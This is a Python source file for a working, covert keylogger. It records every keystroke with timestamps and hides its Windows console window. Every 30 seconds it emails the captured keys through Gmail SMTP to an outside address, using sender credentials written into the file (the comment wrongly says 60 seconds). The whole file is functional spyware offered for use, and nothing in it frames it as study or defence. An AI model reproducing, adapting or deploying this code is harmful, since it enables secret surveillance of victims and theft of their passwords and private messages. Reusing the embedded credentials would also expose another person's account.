import smtplib
from pynput import keyboard
import threading
import os
import sys
from datetime import datetime

# Email settings
EMAIL_ADDRESS = "lazycup6@gmail.com"
EMAIL_PASSWORD = "utgj larv uuqy waim"
SEND_TO = "martialman2005@gmail.com"

log = ""
interval = 30  # Send email every 60 seconds

def send_email(email, password, message):
    with smtplib.SMTP("smtp.gmail.com", 587) as server:
        server.starttls()
        server.login(email, password)
        server.sendmail(email, SEND_TO, message)

def update_log(key):
    global log
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        key_str = key.char
    except AttributeError:
        key_str = f"[{key}]"

    log += f"{timestamp} - {key_str}\n"
def report():
    global log
    if log.strip():  # only send if there's actual content
        subject = "Keylogger Report"
        body = f"Key logs captured:\n\n{log}"
        message = f"Subject: {subject}\n\n{body}"
        send_email(EMAIL_ADDRESS, EMAIL_PASSWORD, message)
        print(f"[+] Sent email:\n{body}")
        log = ""
    timer = threading.Timer(interval, report)
    timer.daemon = True
    timer.start()

def on_press(key):
    update_log(key)

def hide_window():
    """Hide the console window on Windows."""
    import ctypes
    whnd = ctypes.windll.kernel32.GetConsoleWindow()
    if whnd != 0:
        ctypes.windll.user32.ShowWindow(whnd, 0)  # 0 = SW_HIDE
        ctypes.windll.kernel32.CloseHandle(whnd)

# Start everything
if __name__ == "__main__":
    hide_window()
    keyboard_listener = keyboard.Listener(on_press=on_press)
    keyboard_listener.start()
    report()
    keyboard_listener.join()
